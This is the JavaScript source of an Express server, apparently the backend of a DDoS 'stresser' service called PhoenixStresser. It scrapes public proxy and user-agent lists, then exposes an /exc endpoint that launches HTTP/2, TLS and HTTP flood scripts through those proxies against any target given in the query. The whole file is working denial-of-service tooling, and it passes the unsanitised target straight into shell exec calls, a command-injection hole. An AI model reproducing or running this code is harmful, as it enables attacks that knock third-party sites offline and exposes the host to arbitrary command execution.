const express = require('express');
const { exec } = require('child_process');
const fs = require('fs');
const app = express();
const port = process.env.PORT || process.env.SERVER_PORT || 5032;

const proxyUrls = [
  "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
  "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
  "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
  "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
  "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/https.txt",
  "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks4.txt",
  "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt",
  "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
  "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt",
  "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt",
  "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
  "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
  "https://multiproxy.org/txt_all/proxy.txt",
  "https://rootjazz.com/proxies/proxies.txt",
  "https://api.openproxylist.xyz/http.txt",
  "https://api.openproxylist.xyz/https.txt",
  "https://api.openproxylist.xyz/socks4.txt",
  "https://api.openproxylist.xyz/socks5.txt",
  "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
  "https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt",
  "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks4.txt",
  "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks5.txt",
  "https://spys.me/proxy.txt"
];

async function scrapeProxy() {
  try {
    let allData = "";

    for (const url of proxyUrls) {
      try {
        const response = await fetch(url);
        const data = await response.text();
        allData += data + "\n";
      } catch (err) {
        console.log(`❌ Gagal ambil dari ${url}: ${err.message}`);
      }
    }

    fs.writeFileSync("proxy.txt", allData, "utf-8");
    console.log("Semua proxy berhasil disimpan ke proxy.txt");
  } catch (error) {
    console.error(`Error: ${error.message}`);
  }
}

async function scrapeUserAgent() {
  try {
    const response = await fetch('https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt');
    const data = await response.text();
    fs.writeFileSync('ua.txt', data, 'utf-8');
  } catch (error) {
    console.error(`Error fetching data: ${error.message}`);
  }
}
async function fetchData() {
  const response = await fetch('https://httpbin.org/get');
  const data = await response.json();
  console.log(`Copy : http://${data.origin}:${port}`);
  return data;
}

app.get('/exc', (req, res) => {
  const { target, time, methods } = req.query;

  res.status(200).json({
    message: 'API request received. Executing script shortly, By PhoenixStresser',
    target,
    time,
    methods
  });

  
  if (methods === 'LESUS') {
    exec(`node ./methods/H2CA.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/HDRH2.js ${target} ${time} 10 100 true`);
    exec(`node ./methods/H2F3.js ${target} ${time} 100 10 proxy.txt`);
   } else if (methods === 'KOMIX') {
    exec(`node ./methods/HTTP.js ${target} ${time}`);
    exec(`node ./methods/HTTPS.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/HTTPX.js ${target} ${time} 100 10 proxy.txt`);
    } else if (methods === 'R2') {
    exec(`node ./methods/TLS.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/R2.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/RAND.js ${target} ${time}`);
    } else if (methods === 'PSHT') {
    exec(`node ./methods/H2CA.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/HDRH2.js ${target} ${time} 10 100 true`);
    exec(`node ./methods/H2F3.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/HTTP.js ${target} ${time}`);
    exec(`node ./methods/RAND.js ${target} ${time}`);
    exec(`node ./methods/TLS.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/R2.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/HTTPS.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/HTTPX.js ${target} ${time} 100 10 proxy.txt`);
   } else {
    console.log('Metode tidak dikenali atau format salah.');
  }
});

app.listen(port, () => {
  scrapeProxy();
  scrapeUserAgent();
  fetchData();
});
